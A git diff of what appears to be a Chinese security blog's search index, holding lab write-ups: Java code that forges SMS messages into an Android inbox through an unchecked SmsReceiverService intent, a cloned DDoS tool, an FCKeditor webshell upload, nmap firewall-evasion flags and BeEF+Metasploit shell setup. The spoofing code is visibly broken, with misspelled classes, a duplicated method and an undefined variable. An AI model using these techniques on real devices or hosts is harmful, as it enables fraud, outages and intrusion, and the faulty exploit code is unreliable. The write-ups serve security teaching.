@@ -2,7 +2,7 @@
 <search>
   <entry>
     <title>APK静态分析</title>
-    <url>/2021/12/28/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/</url>
+    <url>/blog/2021/12/28/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<h2 id="APK静态分析"><a href="#APK静态分析" class="headerlink" title="APK静态分析"></a>APK静态分析</h2><p>目的：</p>
 <ul>
 <li>了解APK（DEX）静态分析的基本步骤</li>
@@ -41,49 +41,20 @@
       </tags>
   </entry>
   <entry>
-    <title>Android安全之短信欺诈漏洞</title>
-    <url>/2021/12/27/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>目的：</p>
-<ul>
-<li>通过JAVA编程理解Android手机安全漏洞的基本原理</li>
-<li>用JAVA编写伪造短信代码，向系统收件箱发送伪造短信</li>
-</ul>
-<p>原理：</p>
-<ul>
-<li>漏洞原理介绍</li>
-<li>该系统漏洞能够使攻击者无需申请任何权限发送短信到用户收件箱。 出现该漏洞的原因是Android系统的com.android.mms.transaction。</li>
-<li>SmsReceiverService系统服务未判断启动服务的调用者，攻击者可以通过该应用发送伪装短信到用户收件箱。本漏洞实质上是一种能力的泄漏。</li>
-<li>漏洞发送的短信并不经过GSM网络,所以即使手机没有插sim卡,也照样可以收到短信,这让大部分的短信防火墙完全失效。</li>
-</ul>
-<p>过程：</p>
-<p>打开eclipse，点击file-import，选择android目录下的existing android code into workspace<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100046569.png" alt="image-20211229100046569"></p>
-<p>选择simpleedu28项目<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100118574.png" alt="image-20211229100118574"></p>
-<p>导入后的项目<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100200697.png" alt="image-20211229100200697"></p>
-<p>在工程目录res/layout的界面代码，这里可以通过控制代码，编辑相应的函数生成欺诈短信，点击activity_main.xml，可以看到界面布局的文件<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100257165.png" alt="image-20211229100257165"></p>
-<p>在mainactivity中添加运行欺诈短信的代码，点开<code>msgdemo2\src\com.example.msgdemol\mainactivity.java</code><img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100406295.png" alt="image-20211229100406295"></p>
-<p>在mainactivity的init()函数添加如下代码，为button设置监听事件</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//为发送按钮设置监听</span></span><br><span class="line">sendBt.setOnClickListener(<span class="keyword">new</span> OnClickListener()&#123;</span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">                       <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 *获取输入的伪造号码和内</span></span><br><span class="line"><span class="comment">                 *判断输入是否合法</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">String num=msgNumTv.getText().toString();</span><br><span class="line">String con=msgConTv.getText().toString();</span><br><span class="line">If(num.length()&lt;<span class="number">1</span>||con.length()&lt;<span class="number">1</span>)</span><br><span class="line">&#123; Toast.makeText(MainActivity.<span class="keyword">this</span>,”电话号码或者内容没有输入”,Toast.LENGTH_SHORT).show();</span><br><span class="line"><span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="comment">//判断通过伪造短信</span></span><br><span class="line"><span class="comment">//make Msg(MainActivity.this,num,con);</span></span><br><span class="line">createFakeMsg(MainActivity.<span class="keyword">this</span>,num,con);&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+    <title>DDos攻击</title>
+    <url>/blog/2021/11/24/DDos%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h2 id="DDos攻击"><a href="#DDos攻击" class="headerlink" title="DDos攻击"></a>DDos攻击</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Ha3MrX/DDOs-Attack   # 下载工具</span><br><span class="line">vim ddos-attack.py</span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python2</span></span><br><span class="line">chmod +777 ddos-attack.py #直接使用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>在MainActivity的init()函数,跳转到init函数位置添加上一步的代码</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229101856123.png" alt="image-20211229101856123">createFakeMsg的具体代码</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *伪造短信</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment"><span class="doctag">@param</span> num</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> con</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">          <span class="function">Private <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">createFakeMsg</span><span class="params">(Context context,String num,String con)</span></span>&#123;</span><br><span class="line">                <span class="keyword">byte</span>[] pdu=<span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">byte</span>[] scBytes=PhoneNumberUtils.networkPortionToCalledPartyBCD(num);</span><br><span class="line">                <span class="keyword">int</span> lsmcs=scBytes.length;</span><br><span class="line">                <span class="keyword">byte</span>[] dateBytes=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">7</span>];</span><br><span class="line">                Calendar calendar=<span class="keyword">new</span> GregorianCalendar();</span><br><span class="line">                dateBytes[<span class="number">0</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.YEAR)));</span><br><span class="line">                dateBytes[<span class="number">1</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.MONTH)+<span class="number">1</span>));</span><br><span class="line">                dateBytes[<span class="number">2</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.DAY_OF_MONTH)));</span><br><span class="line">                dateBytes[<span class="number">3</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.HOUR_OF_DAY)));</span><br><span class="line">                dateBytes[<span class="number">4</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.MINUTE)));</span><br><span class="line">                dateBytes[<span class="number">5</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.SECOND)));</span><br><span class="line">                dateBytes[<span class="number">6</span>]=reverseByte((<span class="keyword">byte</span>)(（calendar.get(Caledar.ZONE_OFFSET)+calendar.get(Calendar.DST_OFFSET))/(<span class="number">60</span>*<span class="number">1000</span>*<span class="number">15</span>)）);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">          <span class="comment">// Log.d(LOG,”test one”);</span></span><br><span class="line">                 ByteArrayOutputStream bo=<span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">                 bo.write(lsmcs);</span><br><span class="line">                 bo.write(scBytes);</span><br><span class="line">                 bo.write(<span class="number">0x04</span>);</span><br><span class="line">                 bo.write((<span class="keyword">byte</span>)num.length());</span><br><span class="line">                 bo.write(senderBytes);</span><br><span class="line">                 bo.write(<span class="number">0x00</span>);</span><br><span class="line">                 bo.write(<span class="number">0x00</span>);<span class="comment">//encoding:0 for default 7bit</span></span><br><span class="line">                 bo.write(dateBytes);</span><br><span class="line">                 <span class="keyword">try</span>&#123;</span><br><span class="line">          String sReflectedClassName=”com.android.internal.telephony.GsmAlphabet”;</span><br><span class="line">          Class cRefectedNFCExtras=Class.forName(sReflectedClassName);</span><br><span class="line">          Method stringToGsm7BitPacketd=cReflectedNFCExtras.getMethod(“stringToGsm7BitPacketd”,<span class="keyword">new</span> Clas[]&#123;String.class&#125;);</span><br><span class="line">          stringToGsm7BitPacked.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">          <span class="keyword">byte</span>[] conbytes=(<span class="keyword">byte</span>[]) stringToGsm7BitPacked.invoke(<span class="keyword">null</span>,con);</span><br><span class="line">          bo.write(conbytes);</span><br><span class="line">          &#125;<span class="keyword">catch</span>(Exception e)&#123;e.printStackTrace();&#125;</span><br><span class="line">          pdu=bo.toByteArray();&#125;</span><br><span class="line">          <span class="keyword">catch</span>(IOException e)&#123;e.printStackTrace();&#125;</span><br><span class="line">          Intent intent=newIntent();</span><br><span class="line">          Intent.setClassName（“com.android.mms.transaction.SmsReceiverService”）;</span><br><span class="line">          Intent.setAction(“android.provider.Telephony.SMS_RECEIVED”);</span><br><span class="line">          Intent.putExtra(“pdus”,<span class="keyword">new</span> Object[]&#123;pdu&#125;);</span><br><span class="line">          <span class="comment">//intent.putExtra(“format”,”3gpp”);</span></span><br><span class="line">          Context.startService(intent);&#125;</span><br><span class="line">          <span class="function">Private <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">reverseByte</span><span class="params">(<span class="keyword">byte</span> b)</span></span>&#123;</span><br><span class="line">          <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">reverseByte</span><span class="params">(<span class="keyword">byte</span> b)</span></span>&#123;</span><br><span class="line">          <span class="keyword">return</span> (<span class="keyword">byte</span>)((b&amp;<span class="number">0xf0</span>)&gt;&gt;<span class="number">4</span>|(b&amp;<span class="number">0x0f</span>)&lt;&lt;<span class="number">4</span>);&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在已经设计好的欺诈短信发送界面，有两部分内容：伪造号码与伪造内容。这里的伪造号码，这是发件人的号码，因为是发给自己，所以没有收件人号码，。至于内容可以随意填写内容，使短信更具欺诈性。</p>
-<p>AVD中打开虚拟机Simpleedu28虚拟安卓<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102354469.png" alt="image-20211229102354469"></p>
-<p>右键MSGDEMO2，选择run as-android application按钮<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102712162.png" alt="image-20211229102712162"></p>
-<p>虚拟端返回运行后结果<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102740838.png" alt="image-20211229102740838"></p>
-<p>点击发送，手机接收欺诈短信</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102848974.png" alt="image-20211229102848974"></p>
 ]]></content>
       <tags>
-        <tag>Android</tag>
-        <tag>短信</tag>
-        <tag>欺诈</tag>
+        <tag>ddos</tag>
+        <tag>python</tag>
+        <tag>kali</tag>
       </tags>
   </entry>
   <entry>
     <title>APP加壳</title>
-    <url>/2021/12/27/APP%E5%8A%A0%E5%A3%B3/</url>
+    <url>/blog/2021/12/27/APP%E5%8A%A0%E5%A3%B3/</url>
     <content><![CDATA[<h2 id="APP加壳"><a href="#APP加壳" class="headerlink" title="APP加壳"></a>APP加壳</h2><p>目的：</p>
 <ul>
 <li>熟悉常用Android编译工具的使用</li>
@@ -126,20 +97,49 @@
       </tags>
   </entry>
   <entry>
-    <title>DDos攻击</title>
-    <url>/2021/11/24/DDos%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<h2 id="DDos攻击"><a href="#DDos攻击" class="headerlink" title="DDos攻击"></a>DDos攻击</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Ha3MrX/DDOs-Attack   # 下载工具</span><br><span class="line">vim ddos-attack.py</span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python2</span></span><br><span class="line">chmod +777 ddos-attack.py #直接使用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+    <title>Android安全之短信欺诈漏洞</title>
+    <url>/blog/2021/12/27/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>目的：</p>
+<ul>
+<li>通过JAVA编程理解Android手机安全漏洞的基本原理</li>
+<li>用JAVA编写伪造短信代码，向系统收件箱发送伪造短信</li>
+</ul>
+<p>原理：</p>
+<ul>
+<li>漏洞原理介绍</li>
+<li>该系统漏洞能够使攻击者无需申请任何权限发送短信到用户收件箱。 出现该漏洞的原因是Android系统的com.android.mms.transaction。</li>
+<li>SmsReceiverService系统服务未判断启动服务的调用者，攻击者可以通过该应用发送伪装短信到用户收件箱。本漏洞实质上是一种能力的泄漏。</li>
+<li>漏洞发送的短信并不经过GSM网络,所以即使手机没有插sim卡,也照样可以收到短信,这让大部分的短信防火墙完全失效。</li>
+</ul>
+<p>过程：</p>
+<p>打开eclipse，点击file-import，选择android目录下的existing android code into workspace<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100046569.png" alt="image-20211229100046569"></p>
+<p>选择simpleedu28项目<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100118574.png" alt="image-20211229100118574"></p>
+<p>导入后的项目<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100200697.png" alt="image-20211229100200697"></p>
+<p>在工程目录res/layout的界面代码，这里可以通过控制代码，编辑相应的函数生成欺诈短信，点击activity_main.xml，可以看到界面布局的文件<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100257165.png" alt="image-20211229100257165"></p>
+<p>在mainactivity中添加运行欺诈短信的代码，点开<code>msgdemo2\src\com.example.msgdemol\mainactivity.java</code><img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100406295.png" alt="image-20211229100406295"></p>
+<p>在mainactivity的init()函数添加如下代码，为button设置监听事件</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//为发送按钮设置监听</span></span><br><span class="line">sendBt.setOnClickListener(<span class="keyword">new</span> OnClickListener()&#123;</span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">                       <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 *获取输入的伪造号码和内</span></span><br><span class="line"><span class="comment">                 *判断输入是否合法</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">String num=msgNumTv.getText().toString();</span><br><span class="line">String con=msgConTv.getText().toString();</span><br><span class="line">If(num.length()&lt;<span class="number">1</span>||con.length()&lt;<span class="number">1</span>)</span><br><span class="line">&#123; Toast.makeText(MainActivity.<span class="keyword">this</span>,”电话号码或者内容没有输入”,Toast.LENGTH_SHORT).show();</span><br><span class="line"><span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="comment">//判断通过伪造短信</span></span><br><span class="line"><span class="comment">//make Msg(MainActivity.this,num,con);</span></span><br><span class="line">createFakeMsg(MainActivity.<span class="keyword">this</span>,num,con);&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
 
+<p>在MainActivity的init()函数,跳转到init函数位置添加上一步的代码</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229101856123.png" alt="image-20211229101856123">createFakeMsg的具体代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *伪造短信</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment"><span class="doctag">@param</span> num</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> con</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">          <span class="function">Private <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">createFakeMsg</span><span class="params">(Context context,String num,String con)</span></span>&#123;</span><br><span class="line">                <span class="keyword">byte</span>[] pdu=<span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">byte</span>[] scBytes=PhoneNumberUtils.networkPortionToCalledPartyBCD(num);</span><br><span class="line">                <span class="keyword">int</span> lsmcs=scBytes.length;</span><br><span class="line">                <span class="keyword">byte</span>[] dateBytes=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">7</span>];</span><br><span class="line">                Calendar calendar=<span class="keyword">new</span> GregorianCalendar();</span><br><span class="line">                dateBytes[<span class="number">0</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.YEAR)));</span><br><span class="line">                dateBytes[<span class="number">1</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.MONTH)+<span class="number">1</span>));</span><br><span class="line">                dateBytes[<span class="number">2</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.DAY_OF_MONTH)));</span><br><span class="line">                dateBytes[<span class="number">3</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.HOUR_OF_DAY)));</span><br><span class="line">                dateBytes[<span class="number">4</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.MINUTE)));</span><br><span class="line">                dateBytes[<span class="number">5</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.SECOND)));</span><br><span class="line">                dateBytes[<span class="number">6</span>]=reverseByte((<span class="keyword">byte</span>)(（calendar.get(Caledar.ZONE_OFFSET)+calendar.get(Calendar.DST_OFFSET))/(<span class="number">60</span>*<span class="number">1000</span>*<span class="number">15</span>)）);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">          <span class="comment">// Log.d(LOG,”test one”);</span></span><br><span class="line">                 ByteArrayOutputStream bo=<span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">                 bo.write(lsmcs);</span><br><span class="line">                 bo.write(scBytes);</span><br><span class="line">                 bo.write(<span class="number">0x04</span>);</span><br><span class="line">                 bo.write((<span class="keyword">byte</span>)num.length());</span><br><span class="line">                 bo.write(senderBytes);</span><br><span class="line">                 bo.write(<span class="number">0x00</span>);</span><br><span class="line">                 bo.write(<span class="number">0x00</span>);<span class="comment">//encoding:0 for default 7bit</span></span><br><span class="line">                 bo.write(dateBytes);</span><br><span class="line">                 <span class="keyword">try</span>&#123;</span><br><span class="line">          String sReflectedClassName=”com.android.internal.telephony.GsmAlphabet”;</span><br><span class="line">          Class cRefectedNFCExtras=Class.forName(sReflectedClassName);</span><br><span class="line">          Method stringToGsm7BitPacketd=cReflectedNFCExtras.getMethod(“stringToGsm7BitPacketd”,<span class="keyword">new</span> Clas[]&#123;String.class&#125;);</span><br><span class="line">          stringToGsm7BitPacked.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">          <span class="keyword">byte</span>[] conbytes=(<span class="keyword">byte</span>[]) stringToGsm7BitPacked.invoke(<span class="keyword">null</span>,con);</span><br><span class="line">          bo.write(conbytes);</span><br><span class="line">          &#125;<span class="keyword">catch</span>(Exception e)&#123;e.printStackTrace();&#125;</span><br><span class="line">          pdu=bo.toByteArray();&#125;</span><br><span class="line">          <span class="keyword">catch</span>(IOException e)&#123;e.printStackTrace();&#125;</span><br><span class="line">          Intent intent=newIntent();</span><br><span class="line">          Intent.setClassName（“com.android.mms.transaction.SmsReceiverService”）;</span><br><span class="line">          Intent.setAction(“android.provider.Telephony.SMS_RECEIVED”);</span><br><span class="line">          Intent.putExtra(“pdus”,<span class="keyword">new</span> Object[]&#123;pdu&#125;);</span><br><span class="line">          <span class="comment">//intent.putExtra(“format”,”3gpp”);</span></span><br><span class="line">          Context.startService(intent);&#125;</span><br><span class="line">          <span class="function">Private <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">reverseByte</span><span class="params">(<span class="keyword">byte</span> b)</span></span>&#123;</span><br><span class="line">          <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">reverseByte</span><span class="params">(<span class="keyword">byte</span> b)</span></span>&#123;</span><br><span class="line">          <span class="keyword">return</span> (<span class="keyword">byte</span>)((b&amp;<span class="number">0xf0</span>)&gt;&gt;<span class="number">4</span>|(b&amp;<span class="number">0x0f</span>)&lt;&lt;<span class="number">4</span>);&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在已经设计好的欺诈短信发送界面，有两部分内容：伪造号码与伪造内容。这里的伪造号码，这是发件人的号码，因为是发给自己，所以没有收件人号码，。至于内容可以随意填写内容，使短信更具欺诈性。</p>
+<p>AVD中打开虚拟机Simpleedu28虚拟安卓<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102354469.png" alt="image-20211229102354469"></p>
+<p>右键MSGDEMO2，选择run as-android application按钮<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102712162.png" alt="image-20211229102712162"></p>
+<p>虚拟端返回运行后结果<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102740838.png" alt="image-20211229102740838"></p>
+<p>点击发送，手机接收欺诈短信</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102848974.png" alt="image-20211229102848974"></p>
 ]]></content>
       <tags>
-        <tag>ddos</tag>
-        <tag>python</tag>
-        <tag>kali</tag>
+        <tag>Android</tag>
+        <tag>短信</tag>
+        <tag>欺诈</tag>
       </tags>
   </entry>
   <entry>
     <title>Fckeditor漏洞上传webshell</title>
-    <url>/2021/12/27/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/</url>
+    <url>/blog/2021/12/27/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/</url>
     <content><![CDATA[<p>目的：Fckeditor为在线网页编辑器。本实验演示<code>Fckeditor2.4.2</code>以下版本的一个编辑器上传漏洞。</p>
 <p>原理：Fckeditor在2.4.2以下存在一个直接上传任意文件的上传页面，可直接上传webshell。</p>
 <p>过程：</p>
@@ -178,7 +178,7 @@
   </entry>
   <entry>
     <title>Nmap简单使用</title>
-    <url>/2021/11/24/Nmap%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
+    <url>/blog/2021/11/24/Nmap%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<h2 id="Nmap简单使用"><a href="#Nmap简单使用" class="headerlink" title="Nmap简单使用"></a>Nmap简单使用</h2><h3 id="躲避防火墙，分组发送报文"><a href="#躲避防火墙，分组发送报文" class="headerlink" title="躲避防火墙，分组发送报文"></a>躲避防火墙，分组发送报文</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -f -v 127.0.0.1</span><br></pre></td></tr></table></figure>
 
 <h3 id="设定最大传输单元，必须是8的倍数"><a href="#设定最大传输单元，必须是8的倍数" class="headerlink" title="设定最大传输单元，必须是8的倍数"></a>设定最大传输单元，必须是8的倍数</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --mtu 16 127.0.0.1</span><br></pre></td></tr></table></figure>
@@ -199,8 +199,61 @@
       </tags>
   </entry>
   <entry>
+    <title>beef+metasploit利用浏览器获取shell</title>
+    <url>/blog/2021/12/20/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/</url>
+    <content><![CDATA[<h2 id="beef-metasploit利用浏览器获取shell"><a href="#beef-metasploit利用浏览器获取shell" class="headerlink" title="beef+metasploit利用浏览器获取shell"></a>beef+metasploit利用浏览器获取shell</h2><h3 id="利用beef获得目标主机shell"><a href="#利用beef获得目标主机shell" class="headerlink" title="利用beef获得目标主机shell"></a>利用beef获得目标主机shell</h3><h4 id="原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。"><a href="#原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。" class="headerlink" title="原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。"></a>原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。</h4><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，将beef和metasploit进行关联，终端进入<code>beef-xss</code>目录，编辑文件<code>config.yaml</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220195046684.png" alt="image-20211220195046684"></p>
+<p>将文件中metasploit的<code>enable</code>的<code>false</code>修改为<code>true</code>,保存退出</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220195427947.png" alt="image-20211220195427947"></p>
+<p>进入 /usr/share/beef-xss/extensions/metasploit/目录，编辑<code>config.yaml</code>文件，把<code>host</code>的参数跟<code>callback_host</code>参数修改成kali主机ip</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220195701762.png" alt="image-20211220195701762"></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220195837527.png" alt="image-20211220195837527"></p>
+<p>将<code>custom path</code>的路径修改为 <code>/usr/share/metasploit-framework/</code>，保存退出</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220200034953.png" alt="image-20211220200034953"></p>
+<p>输入命令<code>/etc/init.d/postgresql start</code>，启动postgresql服务，输入命令<code>msfdb init</code>，初始化数据库</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220200335286.png" alt="image-20211220200335286"></p>
+<p>终端中输入msfconsole，启动metasploit，输入<code>load msgrpc ServerHost=ip Pass=abc123</code></p>
